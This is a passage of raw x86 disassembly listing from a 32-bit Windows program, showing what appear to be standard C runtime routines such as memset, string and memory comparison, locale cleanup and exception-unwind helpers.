  427990:	mov    DWORD PTR [ebp-0x18],esp
  427993:	mov    edi,esp
  427995:	mov    DWORD PTR [ebp-0x44],edi
  427998:	push   esi
  427999:	push   ebx
  42799a:	push   edi
  42799b:	call   0x427c40
  4279a0:	add    esp,0xc
  4279a3:	jmp    0x4279b5
  4279a5:	xor    eax,eax
  4279a7:	inc    eax
  4279a8:	ret    
  4279a9:	mov    esp,DWORD PTR [ebp-0x18]
  4279ac:	call   0x4287d5
  4279b1:	xor    ebx,ebx
  4279b3:	xor    edi,edi
  4279b5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4279b9:	cmp    edi,ebx
  4279bb:	jne    0x4279e0
  4279bd:	push   DWORD PTR [ebp-0x40]
  4279c0:	call   0x426062
  4279c5:	pop    ecx
  4279c6:	mov    edi,eax
  4279c8:	cmp    edi,ebx
  4279ca:	je     0x4279fd
  4279cc:	push   DWORD PTR [ebp-0x40]
  4279cf:	push   ebx
  4279d0:	push   edi
  4279d1:	call   0x427c40
  4279d6:	add    esp,0xc
  4279d9:	mov    DWORD PTR [ebp-0x38],0x1
  4279e0:	push   DWORD PTR [ebp-0x40]
  4279e3:	push   edi
  4279e4:	push   DWORD PTR [ebp+0x14]
  4279e7:	push   DWORD PTR [ebp-0x34]
  4279ea:	push   DWORD PTR [ebp+0xc]
  4279ed:	push   DWORD PTR [ebp+0x8]
  4279f0:	call   DWORD PTR ds:0x4290e8
  4279f6:	mov    DWORD PTR [ebp-0x40],eax
  4279f9:	cmp    eax,ebx
  4279fb:	jne    0x427a01
  4279fd:	xor    esi,esi
  4279ff:	jmp    0x427a27
  427a01:	push   DWORD PTR [ebp+0x1c]
  427a04:	push   DWORD PTR [ebp+0x18]
  427a07:	lea    eax,[ebp-0x40]
  427a0a:	push   eax
  427a0b:	push   edi
  427a0c:	push   DWORD PTR [ebp+0x20]
  427a0f:	push   DWORD PTR [ebp-0x3c]
  427a12:	call   0x428606
  427a17:	add    esp,0x18
  427a1a:	mov    esi,eax
  427a1c:	neg    esi
  427a1e:	sbb    esi,esi
  427a20:	neg    esi
  427a22:	jmp    0x427a27
  427a24:	mov    esi,DWORD PTR [ebp-0x48]
  427a27:	cmp    DWORD PTR [ebp-0x38],ebx
  427a2a:	je     0x427a4f
  427a2c:	push   edi
  427a2d:	call   0x425f4a
  427a32:	pop    ecx
  427a33:	jmp    0x427a4f
  427a35:	push   DWORD PTR [ebp+0x1c]
  427a38:	push   DWORD PTR [ebp+0x18]
  427a3b:	push   DWORD PTR [ebp+0x14]
  427a3e:	push   DWORD PTR [ebp+0x10]
  427a41:	push   DWORD PTR [ebp+0xc]
  427a44:	push   DWORD PTR [ebp+0x8]
  427a47:	call   DWORD PTR ds:0x4290e8
  427a4d:	mov    esi,eax
  427a4f:	cmp    DWORD PTR [ebp-0x34],ebx
  427a52:	je     0x427a5d
  427a54:	push   DWORD PTR [ebp-0x34]
  427a57:	call   0x425f4a
  427a5c:	pop    ecx
  427a5d:	mov    eax,esi
  427a5f:	lea    esp,[ebp-0x54]
  427a62:	call   0x42537b
  427a67:	ret    
  427a68:	push   0x1c
  427a6a:	push   0x429e80
  427a6f:	call   0x425340
  427a74:	xor    esi,esi
  427a76:	cmp    DWORD PTR ds:0x45ddc0,esi
  427a7c:	jne    0x427ab3
  427a7e:	lea    eax,[ebp-0x1c]
  427a81:	push   eax
  427a82:	xor    edi,edi
  427a84:	inc    edi
  427a85:	push   edi
  427a86:	push   0x429e54
  427a8b:	push   edi
  427a8c:	call   DWORD PTR ds:0x4290f8
  427a92:	test   eax,eax
  427a94:	je     0x427a9e
  427a96:	mov    DWORD PTR ds:0x45ddc0,edi
  427a9c:	jmp    0x427ab3
  427a9e:	call   DWORD PTR ds:0x429044
  427aa4:	cmp    eax,0x78
  427aa7:	jne    0x427ab3
  427aa9:	mov    DWORD PTR ds:0x45ddc0,0x2
  427ab3:	mov    eax,ds:0x45ddc0
  427ab8:	cmp    eax,0x2
  427abb:	je     0x427bab
  427ac1:	cmp    eax,esi
  427ac3:	je     0x427bab
  427ac9:	cmp    eax,0x1
  427acc:	jne    0x427bd1
  427ad2:	mov    DWORD PTR [ebp-0x20],esi
  427ad5:	mov    DWORD PTR [ebp-0x24],esi
  427ad8:	cmp    DWORD PTR [ebp+0x18],esi
  427adb:	jne    0x427ae5
  427add:	mov    eax,ds:0x45ddb4
  427ae2:	mov    DWORD PTR [ebp+0x18],eax
  427ae5:	push   esi
  427ae6:	push   esi
  427ae7:	push   DWORD PTR [ebp+0x10]
  427aea:	push   DWORD PTR [ebp+0xc]
  427aed:	xor    eax,eax
  427aef:	cmp    DWORD PTR [ebp+0x20],esi
  427af2:	setne  al
  427af5:	lea    eax,[eax*8+0x1]
  427afc:	push   eax
  427afd:	push   DWORD PTR [ebp+0x18]
  427b00:	call   DWORD PTR ds:0x4290ec
  427b06:	mov    edi,eax
  427b08:	mov    DWORD PTR [ebp-0x28],edi
  427b0b:	test   edi,edi
  427b0d:	je     0x427bd1
  427b13:	and    DWORD PTR [ebp-0x4],0x0
  427b17:	lea    ebx,[edi+edi*1]
  427b1a:	mov    eax,ebx
  427b1c:	add    eax,0x3
  427b1f:	and    eax,0xfffffffc
  427b22:	call   0x425390
  427b27:	mov    DWORD PTR [ebp-0x18],esp
  427b2a:	mov    esi,esp
  427b2c:	mov    DWORD PTR [ebp-0x2c],esi
  427b2f:	push   ebx
  427b30:	push   0x0
  427b32:	push   esi
  427b33:	call   0x427c40
  427b38:	add    esp,0xc
  427b3b:	or     DWORD PTR [ebp-0x4],0xffffffff
  427b3f:	jmp    0x427b56
  427b41:	xor    eax,eax
  427b43:	inc    eax
  427b44:	ret    
  427b45:	mov    esp,DWORD PTR [ebp-0x18]
  427b48:	call   0x4287d5
  427b4d:	xor    esi,esi
  427b4f:	or     DWORD PTR [ebp-0x4],0xffffffff
  427b53:	mov    edi,DWORD PTR [ebp-0x28]
  427b56:	test   esi,esi
  427b58:	jne    0x427b71
  427b5a:	push   edi
  427b5b:	push   0x2
  427b5d:	call   0x426458
  427b62:	pop    ecx
  427b63:	pop    ecx
  427b64:	mov    esi,eax
  427b66:	test   esi,esi
  427b68:	je     0x427bd1
  427b6a:	mov    DWORD PTR [ebp-0x24],0x1
  427b71:	push   edi
  427b72:	push   esi
  427b73:	push   DWORD PTR [ebp+0x10]
  427b76:	push   DWORD PTR [ebp+0xc]
  427b79:	push   0x1
  427b7b:	push   DWORD PTR [ebp+0x18]
  427b7e:	call   DWORD PTR ds:0x4290ec
  427b84:	test   eax,eax
  427b86:	je     0x427b99
  427b88:	push   DWORD PTR [ebp+0x14]
  427b8b:	push   eax
  427b8c:	push   esi
  427b8d:	push   DWORD PTR [ebp+0x8]
  427b90:	call   DWORD PTR ds:0x4290f8
  427b96:	mov    DWORD PTR [ebp-0x20],eax
  427b99:	cmp    DWORD PTR [ebp-0x24],0x0
  427b9d:	je     0x427ba6
  427b9f:	push   esi
  427ba0:	call   0x425f4a
  427ba5:	pop    ecx
  427ba6:	mov    eax,DWORD PTR [ebp-0x20]
  427ba9:	jmp    0x427c19
  427bab:	mov    ebx,DWORD PTR [ebp+0x1c]
  427bae:	cmp    ebx,esi
  427bb0:	jne    0x427bb8
  427bb2:	mov    ebx,DWORD PTR ds:0x45dda4
  427bb8:	mov    edi,DWORD PTR [ebp+0x18]
  427bbb:	test   edi,edi
  427bbd:	jne    0x427bc5
  427bbf:	mov    edi,DWORD PTR ds:0x45ddb4
  427bc5:	push   ebx
  427bc6:	call   0x4285bd
  427bcb:	pop    ecx
  427bcc:	cmp    eax,0xffffffff
  427bcf:	jne    0x427bd5
  427bd1:	xor    eax,eax
  427bd3:	jmp    0x427c19
  427bd5:	cmp    eax,edi
  427bd7:	je     0x427bf7
  427bd9:	push   0x0
  427bdb:	push   0x0
  427bdd:	lea    ecx,[ebp+0x10]
  427be0:	push   ecx
  427be1:	push   DWORD PTR [ebp+0xc]
  427be4:	push   eax
  427be5:	push   edi
  427be6:	call   0x428606
  427beb:	add    esp,0x18
  427bee:	mov    esi,eax
  427bf0:	test   esi,esi
  427bf2:	je     0x427bd1
  427bf4:	mov    DWORD PTR [ebp+0xc],esi
  427bf7:	push   DWORD PTR [ebp+0x14]
  427bfa:	push   DWORD PTR [ebp+0x10]
  427bfd:	push   DWORD PTR [ebp+0xc]
  427c00:	push   DWORD PTR [ebp+0x8]
  427c03:	push   ebx
  427c04:	call   DWORD PTR ds:0x4290f4
  427c0a:	mov    edi,eax
  427c0c:	test   esi,esi
  427c0e:	je     0x427c17
  427c10:	push   esi
  427c11:	call   0x425f4a
  427c16:	pop    ecx
  427c17:	mov    eax,edi
  427c19:	lea    esp,[ebp-0x38]
  427c1c:	call   0x42537b
  427c21:	ret    
  427c22:	mov    eax,ds:0x45ddc4
  427c27:	test   eax,eax
  427c29:	je     0x427c3a
  427c2b:	push   DWORD PTR [esp+0x4]
  427c2f:	call   eax
  427c31:	test   eax,eax
  427c33:	pop    ecx
  427c34:	je     0x427c3a
  427c36:	xor    eax,eax
  427c38:	inc    eax
  427c39:	ret    
  427c3a:	xor    eax,eax
  427c3c:	ret    
  427c3d:	int3   
  427c3e:	int3   
  427c3f:	int3   
  427c40:	mov    edx,DWORD PTR [esp+0xc]
  427c44:	mov    ecx,DWORD PTR [esp+0x4]
  427c48:	test   edx,edx
  427c4a:	je     0x427c9b
  427c4c:	xor    eax,eax
  427c4e:	mov    al,BYTE PTR [esp+0x8]
  427c52:	push   edi
  427c53:	mov    edi,ecx
  427c55:	cmp    edx,0x4
  427c58:	jb     0x427c8b
  427c5a:	neg    ecx
  427c5c:	and    ecx,0x3
  427c5f:	je     0x427c6d
  427c61:	sub    edx,ecx
  427c63:	mov    BYTE PTR [edi],al
  427c65:	add    edi,0x1
  427c68:	sub    ecx,0x1
  427c6b:	jne    0x427c63
  427c6d:	mov    ecx,eax
  427c6f:	shl    eax,0x8
  427c72:	add    eax,ecx
  427c74:	mov    ecx,eax
  427c76:	shl    eax,0x10
  427c79:	add    eax,ecx
  427c7b:	mov    ecx,edx
  427c7d:	and    edx,0x3
  427c80:	shr    ecx,0x2
  427c83:	je     0x427c8b
  427c85:	rep stos DWORD PTR es:[edi],eax
  427c87:	test   edx,edx
  427c89:	je     0x427c95
  427c8b:	mov    BYTE PTR [edi],al
  427c8d:	add    edi,0x1
  427c90:	sub    edx,0x1
  427c93:	jne    0x427c8b
  427c95:	mov    eax,DWORD PTR [esp+0x8]
  427c99:	pop    edi
  427c9a:	ret    
  427c9b:	mov    eax,DWORD PTR [esp+0x4]
  427c9f:	ret    
  427ca0:	push   esi
  427ca1:	mov    esi,DWORD PTR [esp+0x8]
  427ca5:	test   esi,esi
  427ca7:	je     0x427e2e
  427cad:	push   DWORD PTR [esi+0x4]
  427cb0:	call   0x425f4a
  427cb5:	push   DWORD PTR [esi+0x8]
  427cb8:	call   0x425f4a
  427cbd:	push   DWORD PTR [esi+0xc]
  427cc0:	call   0x425f4a
  427cc5:	push   DWORD PTR [esi+0x10]
  427cc8:	call   0x425f4a
  427ccd:	push   DWORD PTR [esi+0x14]
  427cd0:	call   0x425f4a
  427cd5:	push   DWORD PTR [esi+0x18]
  427cd8:	call   0x425f4a
  427cdd:	push   DWORD PTR [esi]
  427cdf:	call   0x425f4a
  427ce4:	push   DWORD PTR [esi+0x20]
  427ce7:	call   0x425f4a
  427cec:	push   DWORD PTR [esi+0x24]
  427cef:	call   0x425f4a
  427cf4:	push   DWORD PTR [esi+0x28]
  427cf7:	call   0x425f4a
  427cfc:	push   DWORD PTR [esi+0x2c]
  427cff:	call   0x425f4a
  427d04:	push   DWORD PTR [esi+0x30]
  427d07:	call   0x425f4a
  427d0c:	push   DWORD PTR [esi+0x34]
  427d0f:	call   0x425f4a
  427d14:	push   DWORD PTR [esi+0x1c]
  427d17:	call   0x425f4a
  427d1c:	push   DWORD PTR [esi+0x38]
  427d1f:	call   0x425f4a
  427d24:	push   DWORD PTR [esi+0x3c]
  427d27:	call   0x425f4a
  427d2c:	add    esp,0x40
  427d2f:	push   DWORD PTR [esi+0x40]
  427d32:	call   0x425f4a
  427d37:	push   DWORD PTR [esi+0x44]
  427d3a:	call   0x425f4a
  427d3f:	push   DWORD PTR [esi+0x48]
  427d42:	call   0x425f4a
  427d47:	push   DWORD PTR [esi+0x4c]
  427d4a:	call   0x425f4a
  427d4f:	push   DWORD PTR [esi+0x50]
  427d52:	call   0x425f4a
  427d57:	push   DWORD PTR [esi+0x54]
  427d5a:	call   0x425f4a
  427d5f:	push   DWORD PTR [esi+0x58]
  427d62:	call   0x425f4a
  427d67:	push   DWORD PTR [esi+0x5c]
  427d6a:	call   0x425f4a
  427d6f:	push   DWORD PTR [esi+0x60]
  427d72:	call   0x425f4a
  427d77:	push   DWORD PTR [esi+0x64]
  427d7a:	call   0x425f4a
  427d7f:	push   DWORD PTR [esi+0x68]
  427d82:	call   0x425f4a
  427d87:	push   DWORD PTR [esi+0x6c]
  427d8a:	call   0x425f4a
  427d8f:	push   DWORD PTR [esi+0x70]
  427d92:	call   0x425f4a
  427d97:	push   DWORD PTR [esi+0x74]
  427d9a:	call   0x425f4a
  427d9f:	push   DWORD PTR [esi+0x78]
  427da2:	call   0x425f4a
  427da7:	push   DWORD PTR [esi+0x7c]
  427daa:	call   0x425f4a
  427daf:	add    esp,0x40
  427db2:	push   DWORD PTR [esi+0x80]
  427db8:	call   0x425f4a
  427dbd:	push   DWORD PTR [esi+0x84]
  427dc3:	call   0x425f4a
  427dc8:	push   DWORD PTR [esi+0x88]
  427dce:	call   0x425f4a
  427dd3:	push   DWORD PTR [esi+0x8c]
  427dd9:	call   0x425f4a
  427dde:	push   DWORD PTR [esi+0x90]
  427de4:	call   0x425f4a
  427de9:	push   DWORD PTR [esi+0x94]
  427def:	call   0x425f4a
  427df4:	push   DWORD PTR [esi+0x98]
  427dfa:	call   0x425f4a
  427dff:	push   DWORD PTR [esi+0x9c]
  427e05:	call   0x425f4a
  427e0a:	push   DWORD PTR [esi+0xa0]
  427e10:	call   0x425f4a
  427e15:	push   DWORD PTR [esi+0xa4]
  427e1b:	call   0x425f4a
  427e20:	push   DWORD PTR [esi+0xa8]
  427e26:	call   0x425f4a
  427e2b:	add    esp,0x2c
  427e2e:	pop    esi
  427e2f:	ret    
  427e30:	push   esi
  427e31:	mov    esi,DWORD PTR [esp+0x8]
  427e35:	test   esi,esi
  427e37:	je     0x427e8d
  427e39:	mov    eax,DWORD PTR [esi]
  427e3b:	mov    ecx,DWORD PTR ds:0x45d934
  427e41:	cmp    eax,DWORD PTR [ecx]
  427e43:	je     0x427e54
  427e45:	cmp    eax,DWORD PTR ds:0x45d904
  427e4b:	je     0x427e54
  427e4d:	push   eax
  427e4e:	call   0x425f4a
  427e53:	pop    ecx
  427e54:	mov    eax,DWORD PTR [esi+0x4]
  427e57:	mov    ecx,DWORD PTR ds:0x45d934
  427e5d:	cmp    eax,DWORD PTR [ecx+0x4]
  427e60:	je     0x427e71
  427e62:	cmp    eax,DWORD PTR ds:0x45d908
  427e68:	je     0x427e71
  427e6a:	push   eax
  427e6b:	call   0x425f4a
  427e70:	pop    ecx
  427e71:	mov    esi,DWORD PTR [esi+0x8]
  427e74:	mov    eax,ds:0x45d934
  427e79:	cmp    esi,DWORD PTR [eax+0x8]
  427e7c:	je     0x427e8d
  427e7e:	cmp    esi,DWORD PTR ds:0x45d90c
  427e84:	je     0x427e8d
  427e86:	push   esi
  427e87:	call   0x425f4a
  427e8c:	pop    ecx
  427e8d:	pop    esi
  427e8e:	ret    
  427e8f:	push   esi
  427e90:	mov    esi,DWORD PTR [esp+0x8]
  427e94:	test   esi,esi
  427e96:	je     0x427f66
  427e9c:	mov    eax,DWORD PTR [esi+0xc]
  427e9f:	mov    ecx,DWORD PTR ds:0x45d934
  427ea5:	cmp    eax,DWORD PTR [ecx+0xc]
  427ea8:	je     0x427eb9
  427eaa:	cmp    eax,DWORD PTR ds:0x45d910
  427eb0:	je     0x427eb9
  427eb2:	push   eax
  427eb3:	call   0x425f4a
  427eb8:	pop    ecx
  427eb9:	mov    eax,DWORD PTR [esi+0x10]
  427ebc:	mov    ecx,DWORD PTR ds:0x45d934
  427ec2:	cmp    eax,DWORD PTR [ecx+0x10]
  427ec5:	je     0x427ed6
  427ec7:	cmp    eax,DWORD PTR ds:0x45d914
  427ecd:	je     0x427ed6
  427ecf:	push   eax
  427ed0:	call   0x425f4a
  427ed5:	pop    ecx
  427ed6:	mov    eax,DWORD PTR [esi+0x14]
  427ed9:	mov    ecx,DWORD PTR ds:0x45d934
  427edf:	cmp    eax,DWORD PTR [ecx+0x14]
  427ee2:	je     0x427ef3
  427ee4:	cmp    eax,DWORD PTR ds:0x45d918
  427eea:	je     0x427ef3
  427eec:	push   eax
  427eed:	call   0x425f4a
  427ef2:	pop    ecx
  427ef3:	mov    eax,DWORD PTR [esi+0x18]
  427ef6:	mov    ecx,DWORD PTR ds:0x45d934
  427efc:	cmp    eax,DWORD PTR [ecx+0x18]
  427eff:	je     0x427f10
  427f01:	cmp    eax,DWORD PTR ds:0x45d91c
  427f07:	je     0x427f10
  427f09:	push   eax
  427f0a:	call   0x425f4a
  427f0f:	pop    ecx
  427f10:	mov    eax,DWORD PTR [esi+0x1c]
  427f13:	mov    ecx,DWORD PTR ds:0x45d934
  427f19:	cmp    eax,DWORD PTR [ecx+0x1c]
  427f1c:	je     0x427f2d
  427f1e:	cmp    eax,DWORD PTR ds:0x45d920
  427f24:	je     0x427f2d
  427f26:	push   eax
  427f27:	call   0x425f4a
  427f2c:	pop    ecx
  427f2d:	mov    eax,DWORD PTR [esi+0x20]
  427f30:	mov    ecx,DWORD PTR ds:0x45d934
  427f36:	cmp    eax,DWORD PTR [ecx+0x20]
  427f39:	je     0x427f4a
  427f3b:	cmp    eax,DWORD PTR ds:0x45d924
  427f41:	je     0x427f4a
  427f43:	push   eax
  427f44:	call   0x425f4a
  427f49:	pop    ecx
  427f4a:	mov    esi,DWORD PTR [esi+0x24]
  427f4d:	mov    eax,ds:0x45d934
  427f52:	cmp    esi,DWORD PTR [eax+0x24]
  427f55:	je     0x427f66
  427f57:	cmp    esi,DWORD PTR ds:0x45d928
  427f5d:	je     0x427f66
  427f5f:	push   esi
  427f60:	call   0x425f4a
  427f65:	pop    ecx
  427f66:	pop    esi
  427f67:	ret    
  427f68:	int3   
  427f69:	int3   
  427f6a:	int3   
  427f6b:	int3   
  427f6c:	int3   
  427f6d:	int3   
  427f6e:	int3   
  427f6f:	int3   
  427f70:	push   ebp
  427f71:	mov    ebp,esp
  427f73:	push   esi
  427f74:	xor    eax,eax
  427f76:	push   eax
  427f77:	push   eax
  427f78:	push   eax
  427f79:	push   eax
  427f7a:	push   eax
  427f7b:	push   eax
  427f7c:	push   eax
  427f7d:	push   eax
  427f7e:	mov    edx,DWORD PTR [ebp+0xc]
  427f81:	lea    ecx,[ecx+0x0]
  427f84:	mov    al,BYTE PTR [edx]
  427f86:	or     al,al
  427f88:	je     0x427f93
  427f8a:	add    edx,0x1
  427f8d:	bts    DWORD PTR [esp],eax
  427f91:	jmp    0x427f84
  427f93:	mov    esi,DWORD PTR [ebp+0x8]
  427f96:	or     ecx,0xffffffff
  427f99:	lea    ecx,[ecx+0x0]
  427f9c:	add    ecx,0x1
  427f9f:	mov    al,BYTE PTR [esi]
  427fa1:	or     al,al
  427fa3:	je     0x427fae
  427fa5:	add    esi,0x1
  427fa8:	bt     DWORD PTR [esp],eax
  427fac:	jae    0x427f9c
  427fae:	mov    eax,ecx
  427fb0:	add    esp,0x20
  427fb3:	pop    esi
  427fb4:	leave  
  427fb5:	ret    
  427fb6:	int3   
  427fb7:	int3   
  427fb8:	int3   
  427fb9:	int3   
  427fba:	int3   
  427fbb:	int3   
  427fbc:	int3   
  427fbd:	int3   
  427fbe:	int3   
  427fbf:	int3   
  427fc0:	mov    edx,DWORD PTR [esp+0x4]
  427fc4:	mov    ecx,DWORD PTR [esp+0x8]
  427fc8:	test   edx,0x3
  427fce:	jne    0x42800c
  427fd0:	mov    eax,DWORD PTR [edx]
  427fd2:	cmp    al,BYTE PTR [ecx]
  427fd4:	jne    0x428004
  427fd6:	or     al,al
  427fd8:	je     0x428000
  427fda:	cmp    ah,BYTE PTR [ecx+0x1]
  427fdd:	jne    0x428004
  427fdf:	or     ah,ah
  427fe1:	je     0x428000
  427fe3:	shr    eax,0x10
  427fe6:	cmp    al,BYTE PTR [ecx+0x2]
  427fe9:	jne    0x428004
  427feb:	or     al,al
  427fed:	je     0x428000
  427fef:	cmp    ah,BYTE PTR [ecx+0x3]
  427ff2:	jne    0x428004
  427ff4:	add    ecx,0x4
  427ff7:	add    edx,0x4
  427ffa:	or     ah,ah
  427ffc:	jne    0x427fd0
  427ffe:	mov    edi,edi
  428000:	xor    eax,eax
  428002:	ret    
  428003:	nop
  428004:	sbb    eax,eax
  428006:	shl    eax,1
  428008:	add    eax,0x1
  42800b:	ret    
  42800c:	test   edx,0x1
  428012:	je     0x42802c
  428014:	mov    al,BYTE PTR [edx]
  428016:	add    edx,0x1
  428019:	cmp    al,BYTE PTR [ecx]
  42801b:	jne    0x428004
  42801d:	add    ecx,0x1
  428020:	or     al,al
  428022:	je     0x428000
  428024:	test   edx,0x2
  42802a:	je     0x427fd0
  42802c:	mov    ax,WORD PTR [edx]
  42802f:	add    edx,0x2
  428032:	cmp    al,BYTE PTR [ecx]
  428034:	jne    0x428004
  428036:	or     al,al
  428038:	je     0x428000
  42803a:	cmp    ah,BYTE PTR [ecx+0x1]
  42803d:	jne    0x428004
  42803f:	or     ah,ah
  428041:	je     0x428000
  428043:	add    ecx,0x2
  428046:	jmp    0x427fd0
  428048:	int3   
  428049:	int3   
  42804a:	int3   
  42804b:	int3   
  42804c:	int3   
  42804d:	int3   
  42804e:	int3   
  42804f:	int3   
  428050:	mov    eax,DWORD PTR [esp+0xc]
  428054:	test   eax,eax
  428056:	je     0x4280a2
  428058:	mov    edx,DWORD PTR [esp+0x4]
  42805c:	push   esi
  42805d:	push   edi
  42805e:	mov    esi,edx
  428060:	mov    edi,DWORD PTR [esp+0x10]
  428064:	or     edx,edi
  428066:	and    edx,0x3
  428069:	je     0x4280a3
  42806b:	test   eax,0x1
  428070:	je     0x428083
  428072:	mov    cl,BYTE PTR [esi]
  428074:	cmp    cl,BYTE PTR [edi]
  428076:	jne    0x4280d0
  428078:	add    esi,0x1
  42807b:	add    edi,0x1
  42807e:	sub    eax,0x1
  428081:	je     0x4280a0
  428083:	mov    cl,BYTE PTR [esi]
  428085:	mov    dl,BYTE PTR [edi]
  428087:	cmp    cl,dl
  428089:	jne    0x4280d0
  42808b:	mov    cl,BYTE PTR [esi+0x1]
  42808e:	mov    dl,BYTE PTR [edi+0x1]
  428091:	cmp    cl,dl
  428093:	jne    0x4280d0
  428095:	add    edi,0x2
  428098:	add    esi,0x2
  42809b:	sub    eax,0x2
  42809e:	jne    0x428083
  4280a0:	pop    edi
  4280a1:	pop    esi
  4280a2:	ret    
  4280a3:	mov    ecx,eax
  4280a5:	and    eax,0x3
  4280a8:	shr    ecx,0x2
  4280ab:	je     0x4280d8
  4280ad:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4280af:	je     0x4280d8
  4280b1:	mov    ecx,DWORD PTR [esi-0x4]
  4280b4:	mov    edx,DWORD PTR [edi-0x4]
  4280b7:	cmp    cl,dl
  4280b9:	jne    0x4280cb
  4280bb:	cmp    ch,dh
  4280bd:	jne    0x4280cb
  4280bf:	shr    ecx,0x10
  4280c2:	shr    edx,0x10
  4280c5:	cmp    cl,dl
  4280c7:	jne    0x4280cb
  4280c9:	cmp    ch,dh
  4280cb:	mov    eax,0x0
  4280d0:	sbb    eax,eax
  4280d2:	pop    edi
  4280d3:	sbb    eax,0xffffffff
  4280d6:	pop    esi
  4280d7:	ret    
  4280d8:	test   eax,eax
  4280da:	je     0x4280a0
  4280dc:	mov    edx,DWORD PTR [esi]
  4280de:	mov    ecx,DWORD PTR [edi]
  4280e0:	cmp    dl,cl
  4280e2:	jne    0x4280cb
  4280e4:	sub    eax,0x1
  4280e7:	je     0x428105
  4280e9:	cmp    dh,ch
  4280eb:	jne    0x4280cb
  4280ed:	sub    eax,0x1
  4280f0:	je     0x428105
  4280f2:	and    ecx,0xff0000
  4280f8:	and    edx,0xff0000
  4280fe:	cmp    edx,ecx
  428100:	jne    0x4280cb
  428102:	sub    eax,0x1
  428105:	pop    edi
  428106:	pop    esi
  428107:	ret    
  428108:	int3   
  428109:	int3   
  42810a:	int3   
  42810b:	int3   
  42810c:	int3   
  42810d:	int3   
  42810e:	int3   
  42810f:	int3   
  428110:	push   ebp
  428111:	mov    ebp,esp
  428113:	push   edi
  428114:	push   esi
  428115:	push   ebx
  428116:	mov    ecx,DWORD PTR [ebp+0x10]
  428119:	jecxz  0x428142
  42811b:	mov    ebx,ecx
  42811d:	mov    edi,DWORD PTR [ebp+0x8]
  428120:	mov    esi,edi
  428122:	xor    eax,eax
  428124:	repnz scas al,BYTE PTR es:[edi]
  428126:	neg    ecx
  428128:	add    ecx,ebx
  42812a:	mov    edi,esi
  42812c:	mov    esi,DWORD PTR [ebp+0xc]
  42812f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428131:	mov    al,BYTE PTR [esi-0x1]
  428134:	xor    ecx,ecx
  428136:	cmp    al,BYTE PTR [edi-0x1]
  428139:	ja     0x428140
  42813b:	je     0x428142
  42813d:	sub    ecx,0x2
  428140:	not    ecx
  428142:	mov    eax,ecx
  428144:	pop    ebx
  428145:	pop    esi
  428146:	pop    edi
  428147:	leave  
  428148:	ret    
  428149:	int3   
  42814a:	int3   
  42814b:	int3   
  42814c:	int3   
  42814d:	int3   
  42814e:	int3   
  42814f:	int3   
  428150:	push   ebp
  428151:	mov    ebp,esp
  428153:	push   esi
  428154:	xor    eax,eax
  428156:	push   eax
  428157:	push   eax
  428158:	push   eax
  428159:	push   eax
  42815a:	push   eax
  42815b:	push   eax
  42815c:	push   eax
  42815d:	push   eax
  42815e:	mov    edx,DWORD PTR [ebp+0xc]
  428161:	lea    ecx,[ecx+0x0]
  428164:	mov    al,BYTE PTR [edx]
  428166:	or     al,al
  428168:	je     0x428173
  42816a:	add    edx,0x1
  42816d:	bts    DWORD PTR [esp],eax
  428171:	jmp    0x428164
  428173:	mov    esi,DWORD PTR [ebp+0x8]
  428176:	mov    edi,edi
  428178:	mov    al,BYTE PTR [esi]
  42817a:	or     al,al
  42817c:	je     0x42818a
  42817e:	add    esi,0x1
  428181:	bt     DWORD PTR [esp],eax
  428185:	jae    0x428178
  428187:	lea    eax,[esi-0x1]
  42818a:	add    esp,0x20
  42818d:	pop    esi
  42818e:	leave  
  42818f:	ret    
  428190:	push   ebp
  428191:	mov    ebp,esp
  428193:	push   ebx
  428194:	push   esi
  428195:	push   edi
  428196:	push   ebp
  428197:	push   0x0
  428199:	push   0x0
  42819b:	push   0x4281a8
  4281a0:	push   DWORD PTR [ebp+0x8]
  4281a3:	call   0x428c1e
  4281a8:	pop    ebp
  4281a9:	pop    edi
  4281aa:	pop    esi
  4281ab:	pop    ebx
  4281ac:	mov    esp,ebp
  4281ae:	pop    ebp
  4281af:	ret    
  4281b0:	mov    ecx,DWORD PTR [esp+0x4]
  4281b4:	test   DWORD PTR [ecx+0x4],0x6
  4281bb:	mov    eax,0x1
  4281c0:	je     0x4281d1
  4281c2:	mov    eax,DWORD PTR [esp+0x8]
  4281c6:	mov    edx,DWORD PTR [esp+0x10]
  4281ca:	mov    DWORD PTR [edx],eax
  4281cc:	mov    eax,0x3
  4281d1:	ret    
  4281d2:	push   ebx
  4281d3:	push   esi
  4281d4:	push   edi
  4281d5:	mov    eax,DWORD PTR [esp+0x10]
  4281d9:	push   eax
  4281da:	push   0xfffffffe
  4281dc:	push   0x4281b0
  4281e1:	push   DWORD PTR fs:0x0
  4281e8:	mov    DWORD PTR fs:0x0,esp
  4281ef:	mov    eax,DWORD PTR [esp+0x20]
  4281f3:	mov    ebx,DWORD PTR [eax+0x8]
  4281f6:	mov    esi,DWORD PTR [eax+0xc]
  4281f9:	cmp    esi,0xffffffff
  4281fc:	je     0x42822c
  4281fe:	cmp    esi,DWORD PTR [esp+0x24]
  428202:	je     0x42822c
  428204:	lea    esi,[esi+esi*2]
  428207:	mov    ecx,DWORD PTR [ebx+esi*4]
  42820a:	mov    DWORD PTR [esp+0x8],ecx
  42820e:	mov    DWORD PTR [eax+0xc],ecx
  428211:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  428216:	jne    0x42822a
  428218:	push   0x101
  42821d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  428221:	call   0x428266
  428226:	call   DWORD PTR [ebx+esi*4+0x8]
  42822a:	jmp    0x4281ef
  42822c:	pop    DWORD PTR fs:0x0
  428233:	add    esp,0xc
  428236:	pop    edi
  428237:	pop    esi
  428238:	pop    ebx
  428239:	ret    
  42823a:	xor    eax,eax
  42823c:	mov    ecx,DWORD PTR fs:0x0
  428243:	cmp    DWORD PTR [ecx+0x4],0x4281b0
  42824a:	jne    0x42825c
  42824c:	mov    edx,DWORD PTR [ecx+0xc]
  42824f:	mov    edx,DWORD PTR [edx+0xc]
  428252:	cmp    DWORD PTR [ecx+0x8],edx
  428255:	jne    0x42825c
  428257:	mov    eax,0x1
  42825c:	ret    
  42825d:	push   ebx
  42825e:	push   ecx
  42825f:	mov    ebx,0x45d94c
  428264:	jmp    0x428270
  428266:	push   ebx
  428267:	push   ecx
  428268:	mov    ebx,0x45d94c
  42826d:	mov    ecx,DWORD PTR [ebp+0x8]
  428270:	mov    DWORD PTR [ebx+0x8],ecx
